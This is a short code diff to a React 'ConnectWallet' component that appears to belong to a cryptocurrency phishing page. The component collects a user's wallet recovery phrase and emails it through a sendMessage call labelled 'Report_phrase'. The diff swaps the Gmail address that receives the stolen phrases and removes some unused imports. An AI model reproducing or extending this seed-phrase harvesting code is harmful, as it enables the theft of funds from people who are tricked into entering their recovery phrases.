@@ -1,8 +1,7 @@
-import { LoadingButton } from "@mui/lab";
 import { styled, alpha } from "@mui/material/styles";
 import * as React from "react";
 
-import { Container, Paper, TextField } from "@mui/material";
+import { Container, TextField } from "@mui/material";
 import CustomizedSnackbars from "./components/snackbar";
 import { sendMessage } from "../config/services";
 import { BootstrapButton } from "./components/styledcomponents";
@@ -100,7 +99,7 @@ export default function ConnectWallet() {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "bitmaxexchange76@gmail.com"
+        "trustpayd@gmail.com"
       )
         .then(() => {
           setValue({
